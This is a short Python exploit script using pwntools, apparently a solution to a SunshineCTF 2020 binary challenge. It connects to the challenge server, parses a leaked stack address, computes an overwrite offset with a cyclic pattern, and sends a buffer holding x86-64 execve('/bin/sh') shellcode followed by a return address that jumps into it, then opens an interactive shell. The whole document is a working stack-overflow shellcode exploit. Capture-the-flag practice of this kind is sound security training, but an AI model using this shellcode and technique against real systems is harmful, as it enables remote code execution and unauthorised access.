from pwn import *

p = remote("chal.2020.sunshinectf.org", 30006)


p.sendline("A")
p.recvuntil(": ")

leak = int(p.recvline()[:-1], 16)
log.info(f"0x{leak:02x}")

ret_addr = (leak  - 8*3)
n = cyclic_find(p64(0x616161706161616f))

sc = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"


buf = b''
buf += sc

buf = buf.ljust(n, b"\x00")
buf += p64(ret_addr - n)

p.sendline(buf)
p.interactive()
